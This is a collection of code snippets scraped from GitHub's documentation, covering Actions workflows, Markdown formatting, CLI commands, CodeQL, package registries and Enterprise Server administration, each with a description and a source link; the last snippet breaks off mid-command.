YAML\nDESCRIPTION: This YAML code snippet demonstrates how to use a third-party GitHub Action by pinning it to a full-length commit SHA.  This is required to ensure stability and avoid unexpected changes due to version updates of the third-party action.  First-party actions have the `actions/`, `github/` or `octo-org/` prefix.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_31\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n    - uses: google-github-actions/setup-gcloud@1bee7de035d65ec5da40a31f8589e240eba8fde5\n```\n\n----------------------------------------\n\nTITLE: Exact Match Code Search with Qualifiers\nDESCRIPTION: This snippet shows how to use quoted strings within qualifiers to search for an exact match. It searches for files with \"protocol buffers\" as the language and \"git\" in the path.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_3\n\nLANGUAGE: text\nCODE:\n```\npath:git language:\"protocol buffers\"\n```\n\n----------------------------------------\n\nTITLE: Ignoring UseKeychain Configuration Error - Text\nDESCRIPTION: This configuration block is added to the `~/.ssh/config` file to ignore an error if the `UseKeychain` directive is not supported. It is useful in cases where there are compatibility issues.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent.md#_snippet_5\n\nLANGUAGE: Text\nCODE:\n```\nHost {% ifversion ghes %}HOSTNAME{% else %}github.com{% endif %}\n  IgnoreUnknown UseKeychain\n```\n\n----------------------------------------\n\nTITLE: Verify artifact offline with GitHub CLI\nDESCRIPTION: Verifies an artifact attestation offline using the GitHub CLI (`gh`). Requires the artifact, the downloaded bundle file, and the downloaded trusted root file. Replace `PATH/TO/YOUR/BUILD/ARTIFACT-BINARY` with the path to the artifact, `ORGANIZATION_NAME/REPOSITORY_NAME` with the repository, and `sha256:ae57936def59bc4c75edd3a837d89bcefc6d3a5e31d55a6fa7a71624f92c3c3b.jsonl` with the actual bundle file name.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/verifying-attestations-offline.md#_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ngh attestation verify PATH/TO/YOUR/BUILD/ARTIFACT-BINARY -R ORGANIZATION_NAME/REPOSITORY_NAME --bundle sha256:ae57936def59bc4c75edd3a837d89bcefc6d3a5e31d55a6fa7a71624f92c3c3b.jsonl --custom-trusted-root trusted_root.jsonl\n```\n\n----------------------------------------\n\nTITLE: Quoting Code Inline in Markdown\nDESCRIPTION: This snippet explains how to call out code inline in a sentence using single backticks (`). The text within the backticks will not be formatted, and the element is rendered with a gray background.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax.md#_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\nUse `git status` to list all new or modified files that haven't yet been committed.\n```\n\n----------------------------------------\n\nTITLE: GraphQL Mutation with GitHub CLI in Shell\nDESCRIPTION: This shell script uses the GitHub CLI (`gh api graphql`) to execute a GraphQL mutation. It updates a project item's status and date fields. It requires the `gh` CLI to be installed and configured with appropriate permissions. The script uses environment variables for project ID, item ID, field IDs, status value, and date value.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/automating-projects-using-actions.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\ngh api graphql -f query='\n  mutation (\n    $project: ID!\n    $item: ID!\n    $status_field: ID!\n    $status_value: String!\n    $date_field: ID!\n    $date_value: Date!\n  ) {\n    set_status: updateProjectV2ItemFieldValue(input: {\n      projectId: $project\n      itemId: $item\n      fieldId: $status_field\n      value: {\n        singleSelectOptionId: $status_value\n        }\n    }) {\n      projectV2Item {\n        id\n        }\n    }\n    set_date_posted: updateProjectV2ItemFieldValue(input: {\n      projectId: $project\n      itemId: $item\n      fieldId: $date_field\n      value: {\n        date: $date_value\n      }\n    }) {\n      projectV2Item {\n        id\n      }\n    }\n  }' -f project=$PROJECT_ID -f item=$ITEM_ID -f status_field=$STATUS_FIELD_ID -f status_value={% raw %}${{ env.TODO_OPTION_ID }}{% endraw %} -f date_field=$DATE_FIELD_ID -f date_value=$DATE --silent\n```\n\n----------------------------------------\n\nTITLE: Requesting Image Headers with Curl\nDESCRIPTION: This code snippet demonstrates how to use `curl` to request the headers of an image. The `-I` flag tells `curl` to only retrieve the headers, which contain information about the image's content type, cache control, and server.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/keeping-your-account-and-data-secure/about-anonymized-urls.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ curl -I https://www.my-server.com/images/some-image.png\n> HTTP/2 200\n> Date: Fri, 06 Jun 2014 07:27:43 GMT\n> Expires: Sun, 06 Jul 2014 07:27:43 GMT\n> Content-Type: image/x-png\n> Server: Google Frontend\n> Content-Length: 6507\n```\n\n----------------------------------------\n\nTITLE: Creating Azure Web App with Python Runtime (Azure CLI)\nDESCRIPTION: This command uses the Azure CLI to create an Azure App Service web app with a specified Python runtime. It requires specifying the web app name, App Service plan, resource group, and Python runtime version. Replace the placeholders `MY_WEBAPP_NAME`, `MY_APP_SERVICE_PLAN`, and `MY_RESOURCE_GROUP` with your actual values.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-python-to-azure-app-service.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\naz webapp create \\\n    --name MY_WEBAPP_NAME \\\n    --plan MY_APP_SERVICE_PLAN \\\n    --resource-group MY_RESOURCE_GROUP \\\n    --runtime \"python|3.8\"\n```\n\n----------------------------------------\n\nTITLE: Specifying Multiple Runner Labels with runs-on in YAML\nDESCRIPTION: This snippet demonstrates how to use an array of strings with the `runs-on` keyword to specify that a job should only run on a self-hosted runner that has all the specified labels: `linux`, `x64`, and `gpu`. The workflow will only execute on a runner matching all the specified `runs-on` values.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/choosing-runner-overview.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nruns-on: [self-hosted, linux, x64, gpu]\n```\n\n----------------------------------------\n\nTITLE: CodeQL Predicate Example\nDESCRIPTION: This example demonstrates a CodeQL predicate definition. It can be used within a .ql or .qll file. The predicate `foo` takes a string `s` as input and asserts that `s` is equal to \"bar\". This snippet can be used for quick evaluation in the CodeQL VS Code extension.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-for-vs-code/getting-started-with-codeql-for-vs-code/running-codeql-queries.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\npredicate foo(string s) { s = \"bar\" }\n```\n\n----------------------------------------\n\nTITLE: Contributing to an Existing Branch on GitHub using Git\nDESCRIPTION: This snippet explains how to contribute to an existing branch on GitHub after the project has already been cloned and a new branch has been pushed to GitHub. It demonstrates pulling the latest changes, checking out the existing branch, making changes, staging and committing the changes, and pushing them to GitHub. It assumes a local copy of the repository named `repo` exists.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/about-git.md#_snippet_3\n\nLANGUAGE: Bash\nCODE:\n```\n# change into the `repo` directory\ncd repo\n\n# update all remote tracking branches, and the currently checked out branch\ngit pull\n\n# change into the existing branch called `feature-a`\ngit checkout feature-a\n\n# make changes, for example, edit `file1.md` using the text editor\n\n# stage the changed file\ngit add file1.md\n\n# take a snapshot of the staging area\ngit commit -m \"edit file1\"\n\n# push changes to github\ngit push\n```\n\n----------------------------------------\n\nTITLE: Specifying Feature in Frontmatter Versions\nDESCRIPTION: This YAML snippet demonstrates how to specify a feature within the frontmatter of a content file.  The `feature` key under `versions` indicates which feature is associated with the content. Only one feature can be specified.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/versioning-documentation.md#_snippet_13\n\nLANGUAGE: yaml\nCODE:\n```\nversions:\n  feature: 'meow'\n```\n\n----------------------------------------\n\nTITLE: Configuring pom.xml for package distribution (Subdomain Isolation Disabled)\nDESCRIPTION: This XML snippet configures the `pom.xml` file for publishing a package to GitHub Packages when subdomain isolation is disabled. It defines the repository details, including the repository ID, name, and URL. Replace HOSTNAME with your GitHub Enterprise Server hostname, OWNER with the repository owner and REPOSITORY with the repository name.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-apache-maven-registry.md#_snippet_3\n\nLANGUAGE: xml\nCODE:\n```\n   <distributionManagement>\n      <repository>\n        <id>github</id>\n        <name>GitHub OWNER Apache Maven Packages</name>\n        <url>https://HOSTNAME/_registry/maven/OWNER/REPOSITORY</url>\n      </repository>\n   </distributionManagement>\n```\n\n----------------------------------------\n\nTITLE: Initializing server.rb with Dependencies in Ruby\nDESCRIPTION: This Ruby code snippet demonstrates how to initialize a `server.rb` file with the necessary dependencies for a GitHub App. It uses the Sinatra framework, Octokit for GitHub API interaction, dotenv for managing environment variables, and other libraries for JSON manipulation, webhook signature verification, JWT authentication, time formatting, and logging.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nrequire 'sinatra/base'  # Use the Sinatra web framework\nrequire 'octokit'       # Use the Octokit Ruby library to interact with GitHub's REST API\nrequire 'dotenv/load'   # Manages environment variables\nrequire 'json'          # Allows your app to manipulate JSON data\nrequire 'openssl'       # Verifies the webhook signature\nrequire 'jwt'           # Authenticates a GitHub App\nrequire 'time'          # Gets ISO 8601 representation of a Time object\nrequire 'logger'        # Logs debug statements\n\n# This code is a Sinatra app, for two reasons:\n#   1. Because the app will require a landing page for installation.\n```\n\n----------------------------------------\n\nTITLE: Destroying the git-server service for a node (ghe-spokesctl)\nDESCRIPTION: This command removes the git-server service associated with a specific node from the GitHub Enterprise Server cluster. UUID should be replaced with the UUID of the node.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/replacing-a-cluster-node.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nghe-spokesctl server destroy git-server-UUID\n```\n\n----------------------------------------\n\nTITLE: Creating a basic table using Markdown\nDESCRIPTION: This snippet demonstrates how to create a basic table in Markdown using pipes `|` and hyphens `-`. The hyphens create the column headers, and pipes separate the columns. A blank line is required before the table for correct rendering.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/organizing-information-with-tables.md#_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| First Header  | Second Header |\n| ------------- | ------------- |\n| Content Cell  | Content Cell  |\n| Content Cell  | Content Cell  |\n```\n\n----------------------------------------\n\nTITLE: Device Code Response (XML)\nDESCRIPTION: This snippet shows the XML response format for a device code request. It includes the device code, user code, verification URI, expiration time, and interval for polling. The verification URI includes a placeholder for the GitHub OAuth host code.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/authorizing-oauth-apps.md#_snippet_9\n\nLANGUAGE: xml\nCODE:\n```\n<OAuth>\n  <device_code>3584d83530557fdd1f46af8289938c8ef79f9dc5</device_code>\n  <user_code>WDJB-MJHT</user_code>\n  <verification_uri>{% data variables.product.oauth_host_code %}/login/device</verification_uri>\n  <expires_in>900</expires_in>\n  <interval>5</interval>\n</OAuth>\n```\n\n----------------------------------------\n\nTITLE: Displaying User Information with OAuth\nDESCRIPTION: This HTML (ERB) snippet displays user information retrieved from the GitHub API. It displays the user's login name, public email address (if available), and private email addresses (if the 'user:email' scope was granted).\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/authenticating-to-the-rest-api-with-an-oauth-app.md#_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<p>Hello, <%= login %>!</p>\n<p>\n  <% if !email.nil? && !email.empty? %> It looks like your public email address is <%= email %>.\n  <% else %> It looks like you don't have a public email. That's cool.\n  <% end %>\n</p>\n<p>\n  <% if defined? private_emails %>\n  With your permission, we were also able to dig up your private email addresses:\n  <%= private_emails.map{ |private_email_address| private_email_address[\"email\"] }.join(', ') %>\n  <% else %>\n  Also, you're a bit secretive about your private email addresses.\n  <% end %>\n</p>\n```\n\n----------------------------------------\n\nTITLE: Creating Headings in Markdown\nDESCRIPTION: This code snippet demonstrates how to create headings in Markdown using the '#' symbol. The number of '#' symbols determines the heading level (H1 to H6).\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax.md#_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n# A first-level heading\n## A second-level heading\n### A third-level heading\n```\n\n----------------------------------------\n\nTITLE: Defining the main function\nDESCRIPTION: This defines the `main` function, the entry point of the CLI application. It uses a `case` statement to handle different commands passed as arguments (ARGV). Currently, it includes placeholders for 'help', 'login', and 'whoami' commands.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\ndef main\n  case ARGV[0]\n  when \"help\"\n    puts \"`help` is not yet defined\"\n  when \"login\"\n    puts \"`login` is not yet defined\"\n  when \"whoami\"\n    puts \"`whoami` is not yet defined\"\n  else\n    puts \"Unknown command `#{ARGV[0]}`\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Cargo Registry with YAML in GitHub Actions\nDESCRIPTION: This YAML snippet configures a custom Cargo registry within a GitHub Actions workflow.  It defines the registry type as `cargo-registry`, specifies the registry name, sets the registry URL, and uses a secret to define the authentication token. The token is dynamically injected from GitHub Secrets using the `${{secrets.CARGO_TOKEN}}` syntax.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/dependabot/cargo-private-registry-config-example.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nregistries:\n  cargo-example:\n    type: cargo-registry\n    registry: \"name-of-your-registry\"\n    url: https://cargo.cloudsmith.io/foobaruser/test/\n    token: \"Token ${{secrets.CARGO_TOKEN}}\"\n```\n\n----------------------------------------\n\nTITLE: Define Learning Track Data - YAML\nDESCRIPTION: This YAML snippet illustrates how to define additional data for a specific learning track, including its title, description, and a list of associated guides. The `versions` property allows specifying the GitHub Enterprise Server versions for which the track is available. If absent, the track is available in all versions.\nSOURCE: https://github.com/github/docs/blob/main/data/learning-tracks/README.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\nlearning_track_name:\n  title: 'Learning track title'\n  description: 'Learning track description'\n  versions:\n    ghes: '>=3.0'\n  guides:\n   - /path/to/guide1\n   - /path/to/guide2\n```\n\n----------------------------------------\n\nTITLE: Limit Paths in CodeQL Analysis Workflow (YAML)\nDESCRIPTION: This snippet demonstrates how to configure the CodeQL analysis step in a GitHub Actions workflow to limit the number of paths analyzed to a maximum of one.  It uses the `CODEQL_ACTION_EXTRA_OPTIONS` environment variable to pass the `--max-paths` flag to the CodeQL CLI. Requires the `actions/github-script` action.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/code-scanning/max-paths-setting.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\n  - name: Perform CodeQL Analysis\n    uses: {% data reusables.actions.action-codeql-action-analyze %}\n    env: \n      CODEQL_ACTION_EXTRA_OPTIONS: '{\"database\":{\"interpret-results\":[\"--max-paths\", 1]}}'\n```\n\n----------------------------------------\n\nTITLE: Triggering workflow on project_card events in YAML\nDESCRIPTION: This YAML snippet configures a GitHub workflow to trigger when a `project_card` event occurs, specifically when the `created` or `deleted` activity types are initiated. The workflow uses the `on` keyword to specify the trigger event and its types, which are `created` and `deleted` in this case. This event only occurs for projects owned by the workflow's repository.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_19\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  project_card:\n    types: [created, deleted]\n```\n\n----------------------------------------\n\nTITLE: Triggering workflow on project_column events in YAML\nDESCRIPTION: This YAML snippet configures a GitHub workflow to trigger when a `project_column` event occurs, specifically when the `created` or `deleted` activity types are initiated. The workflow uses the `on` keyword to specify the trigger event and its types, which are `created` and `deleted` in this case. This event only occurs for projects owned by the workflow's repository.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_20\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  project_column:\n    types: [created, deleted]\n```\n\n----------------------------------------\n\nTITLE: Analyzing C/C++ CodeQL database with a CodeQL Query Suite\nDESCRIPTION: This command analyzes a C/C++ CodeQL database using a specified query suite. It downloads the `codeql/cpp-queries` query pack, executes the analysis, and generates a SARIF file for upload to {% data variables.product.prodname_dotcom %}. The `<cpp-database>` parameter represents the path to the CodeQL database.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/analyzing-your-code-with-codeql-queries.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql database analyze <cpp-database> codeql/cpp-queries:codeql-suites/cpp-code-scanning.qls --format=sarifv2.1.0 --output=cpp-results.sarif --download\n```\n\n----------------------------------------\n\nTITLE: Example `runner` Context - JSON\nDESCRIPTION: This JSON snippet showcases the `runner` context, which contains information about the runner environment. The example shows the operating system, architecture, runner name, tool cache, and temporary directory path.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_13\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"os\": \"Linux\",\n  \"arch\": \"X64\",\n  \"name\": \"GitHub Actions 2\",\n  \"tool_cache\": \"/opt/hostedtoolcache\",\n  \"temp\": \"/home/runner/work/_temp\"\n  {%- comment %}\n  # The `runner.workspace` property is purposefully not documented. It is an early Actions property that now isn't relevant for users, compared to `github.workspace`. It is kept around for compatibility.\n  \"workspace\": \"/home/runner/work/hello-world\"\n  {%- endcomment %}\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Security Group using AWS CLI\nDESCRIPTION: This snippet shows how to create a new security group using the AWS CLI. It uses the `aws ec2 create-security-group` command to create a security group with a specified name and description. Replace `SECURITY_GROUP_NAME` and `SECURITY_GROUP_DESCRIPTION` with your desired values.  The security group ID should be saved for later use.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/installing-github-enterprise-server-on-aws.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\naws ec2 create-security-group --group-name SECURITY_GROUP_NAME --description \"SECURITY GROUP DESCRIPTION\"\n```\n\n----------------------------------------\n\nTITLE: Measuring the largest file size with git-sizer\nDESCRIPTION: This snippet uses `git-sizer` and `jq` to determine the size of the largest file (blob) in the repository, in bytes. The `--no-progress` flag suppresses progress output. The `-j` flag makes `git-sizer` generate JSON output. The `jq \".max_blob_size\"` command extracts the value of the `max_blob_size` field from the JSON output.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/overview/planning-your-migration-to-github.md#_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ngit-sizer --no-progress -j | jq \".max_blob_size\"\n```\n\n----------------------------------------\n\nTITLE: Python Code for Calculating Area of Shapes\nDESCRIPTION: This Python code calculates the areas of a rectangle and a circle using separate functions. The code is unnecessarily verbose and can be made more concise by directly printing the results of the function calls.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/refactoring-code-with-github-copilot.md#_snippet_4\n\nLANGUAGE: python\nCODE:\n```\ndef calculate_area_of_rectangle(length, width):\n    area = length * width\n    return area\n\ndef calculate_area_of_circle(radius):\n    import math\n    area = math.pi * (radius ** 2)\n    return area\n\nlength_of_rectangle = 10\nwidth_of_rectangle = 5\narea_of_rectangle = calculate_area_of_rectangle(length_of_rectangle, width_of_rectangle)\nprint(f\"Area of rectangle: {area_of_rectangle}\")\n\nradius_of_circle = 7\narea_of_circle = calculate_area_of_circle(radius_of_circle)\nprint(f\"Area of circle: {area_of_circle}\")\n```\n\n----------------------------------------\n\nTITLE: Passing Data and Secrets to a Workflow in YAML\nDESCRIPTION: This YAML snippet demonstrates how to call a reusable workflow and pass data to it using the `with` keyword, and secrets using the `secrets` keyword.  The `config-path` is passed as an input, and `personal_access_token` is passed as a secret. The input data type should match the type specified in the called workflow.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/pass-inputs-to-reusable-workflows.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  call-workflow-passing-data:\n    uses: octo-org/example-repo/.github/workflows/reusable-workflow.yml@main\n    with:\n      config-path: .github/labeler.yml\n    secrets:\n      personal_access_token: ${{ secrets.token }}\n```\n\n----------------------------------------\n\nTITLE: Marking Node Offline in cluster.conf (INI)\nDESCRIPTION: This code snippet demonstrates how to mark a specific node in a GitHub Enterprise cluster as offline within the `cluster.conf` file.  It involves adding the `offline = true` setting to the node's configuration section. This change is necessary to remove the failed node from the cluster's active operations.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_clustering/replacing-a-cluster-node-mark-offline.md#_snippet_0\n\nLANGUAGE: INI\nCODE:\n```\n[cluster \"ghe-data-node-3\"]\nhostname = ghe-data-node-3\noffline = true\nipv4 = 192.168.0.6\n# ipv6 = fd12:3456:789a:1::6\n```\n\n----------------------------------------\n\nTITLE: Setting Title and Short Title in YAML Frontmatter\nDESCRIPTION: This YAML snippet shows how to set the `title` and `shortTitle` properties for a documentation page. `title` sets the page's main title, while `shortTitle` provides an abbreviated version for navigation elements. It demonstrates how to use `shortTitle` to display a concise title in breadcrumbs when the full title is too long.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-yaml-frontmatter.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\ntitle: Contributing to projects with GitHub Desktop\nshortTitle: Contributing to projects\n```\n\n----------------------------------------\n\nTITLE: Adding a New Remote for Git LFS Migration\nDESCRIPTION: This snippet adds a new remote to the Git repository, pointing to the new LFS server. It then displays the LFS environment using `git lfs env` to verify the remote configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-accounts-and-repositories/managing-repositories-in-your-enterprise/configuring-git-large-file-storage-for-your-enterprise.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\n$ git remote add NEW-REMOTE https://NEW-REMOTE-HOSTNAME/path/to/repo\n&nbsp;\n$ git lfs env\n> git-lfs/1.1.0 (GitHub; darwin amd64; go 1.5.1; git 94d356c)\n> git version 2.7.4 (Apple Git-66)\n&nbsp;\n> Endpoint=https://GITHUB-ENTERPRISE-HOST/path/to/repo/info/lfs (auth=basic)\n> Endpoint (NEW-REMOTE)=https://NEW-REMOTE-HOSTNAME/path/to/repo/info/lfs (auth=none)\n```\n\n----------------------------------------\n\nTITLE: Defining Arm64 Linux Runner Labels - GitHub Actions\nDESCRIPTION: These code snippets represent workflow labels used to specify the arm64 Linux runner environment in GitHub Actions. The labels allow users to select specific Ubuntu versions for their jobs running on arm64 architecture, such as 'ubuntu-24.04-arm' and 'ubuntu-22.04-arm'. These labels are used in the workflow configuration file to determine the virtual machine environment for running the job.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/supported-github-runners.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\nubuntu-24.04-arm\n```\n\nLANGUAGE: YAML\nCODE:\n```\nubuntu-22.04-arm\n```\n\n----------------------------------------\n\nTITLE: Nested Conditional Rendering with FPT and GHES versions\nDESCRIPTION: This snippet demonstrates nested `ifversion` tags to render different content based on both FPT and GHES versions. It renders \"Alpha\" if the context is FPT, \"Bravo\" otherwise, and further renders \"Charlie\" within the `else` branch if the GHES version is within the specified range.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/and-greater-than2.md#_snippet_2\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt %}\n\nAlpha\n\n{% else %}\n\nBravo\n\n{% ifversion ghes > 2.13 and ghes < 2.16 %}\n\nCharlie\n\n{% endif %}\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Configuring Claims JSON in JFrog\nDESCRIPTION: This JSON snippet demonstrates how to configure Claims in JFrog when setting up identity mappings.  It specifies the issuer (`iss`) and repository, ensuring only Actions workflows from the specified repository have access to your JFrog platform.  Setting these claims enhances security by restricting access based on the origin of the request.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-jfrog.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"iss\": \"https://token.actions.githubusercontent.com\",\n  \"repository\": \"octo-org/octo-repo\"\n}\n```\n\n----------------------------------------\n\nTITLE: Running Sinatra Application (Ruby)\nDESCRIPTION: This code block conditionally runs the Sinatra application if the current file is executed directly. It checks if the executed file `$0` is the same as the current file `__FILE__`. If they are the same, it calls the `run!` method to start the Sinatra server.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\n  # Finally some logic to let us run this server directly from the command line,\n  # or with Rack. Don't worry too much about this code. But, for the curious:\n  # $0 is the executed file\n  # __FILE__ is the current file\n  # If they are the same—that is, we are running this file directly, call the\n  # Sinatra run method\n  run! if __FILE__ == $0\n```\n\n----------------------------------------\n\nTITLE: Adding Repository for Migration using ghe-migrator\nDESCRIPTION: This code snippet demonstrates how to add a repository to a migration archive using the `ghe-migrator add` command. The `--lock` option locks the repository during the export process. The repository's URL must be specified. Additionally, the example showcases how to exclude attachments by adding `--exclude_attachments`.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/exporting-migration-data-from-github-enterprise-server.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-migrator add https://HOSTNAME/USERNAME/REPO-NAME --lock\n```\n\n----------------------------------------\n\nTITLE: Example `needs` context JSON\nDESCRIPTION: This JSON snippet presents an example of the `needs` context, which provides information about the results and outputs of jobs that the current job depends on. It shows the `result` and `outputs` for two jobs: `build` and `deploy`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_20\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"build\": {\n    \"result\": \"success\",\n    \"outputs\": {\n      \"build_id\": \"123456\"\n    }\n  },\n  \"deploy\": {\n    \"result\": \"failure\",\n    \"outputs\": {}\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Flask Application Setup with Routing\nDESCRIPTION: This code snippet sets up a Flask application to handle routing and views. It defines routes for the root URL and dynamic pages, mapping them to the `index` view function. The `index` function retrieves page content, title, and navigation menu data and renders the `template.html` file using Jinja2.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/using-copilot-to-migrate-a-project.md#_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nfrom flask import Flask, render_template, request\nimport os\n\napp = Flask(__name__)\n\nconfig = {\n   'name': 'Simple Python Website',\n   'site_url': '',\n   'pretty_uri': False,\n   'nav_menu': {\n      '': 'Home',\n      'about-us': 'About Us',\n      'products': 'Products',\n      'contact': 'Contact',\n   },\n   'template_path': 'template',\n   'content_path': 'content',\n   'version': 'v3.1',\n}\n\ndef get_config(key=''):\n   return config.get(key, None)\n\n@app.route('/')\n@app.route('/<page>')\ndef index(page='home'):\n   page_content = get_page_content(page)\n   page_title = get_page_title(page)\n   nav_menu = get_nav_menu()\n   return render_template('template.html', page_title=page_title, page_content=page_content, nav_menu=nav_menu)\n\ndef get_page_title(page):\n   return ' '.join(word.capitalize() for word in page.split('-'))\n\ndef get_page_content(page):\n   path = os.path.join(os.getcwd(), get_config('content_path'), f'{page}.phtml')\n   if not os.path.exists(path):\n      path = os.path.join(os.getcwd(), get_config('content_path'), '404.phtml')\n   with open(path, 'r') as file:\n      return file.read()\n\ndef get_nav_menu(sep=' | '):\n   nav_menu = ''\n   nav_items = get_config('nav_menu')\n   for uri, name in nav_items.items():\n      query_string = request.args.get('page', '')\n      class_active = ' active' if query_string == uri else ''\n      url = f\"{get_config('site_url')}/{'' if get_config('pretty_uri') or uri == '' else '?page='}{uri}\"\n      nav_menu += f'<a href=\"{url}\" title=\"{name}\" class=\"item{class_active}\">{name}</a>{sep}'\n   return nav_menu.strip(sep)\n\nif __name__ == '__main__':\n   app.run(debug=True)\n```\n\n----------------------------------------\n\nTITLE: Tool Tag: CLI\nDESCRIPTION: This code snippet demonstrates how to use the `cli` tag to display content relevant to GitHub CLI users. It wraps instructions specific to the GitHub CLI.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_11\n\nLANGUAGE: text\nCODE:\n```\n{% raw %}{% cli %}\n\nThese instructions are pertinent to GitHub CLI users.\n\n{% endcli %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Extracting GitHub Backup Utilities Archive (tar)\nDESCRIPTION: This command extracts the downloaded GitHub Enterprise Backup Utilities archive using the `tar` utility. It assumes the archive is located at `/path/to/github-backup-utils-vMAJOR.MINOR.PATCH.tar.gz`.  Replace `MAJOR`, `MINOR`, and `PATCH` with the actual version numbers. This creates a new directory named after the archive.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/backing-up-and-restoring-your-instance/configuring-backups-on-your-instance.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ntar -xzvf 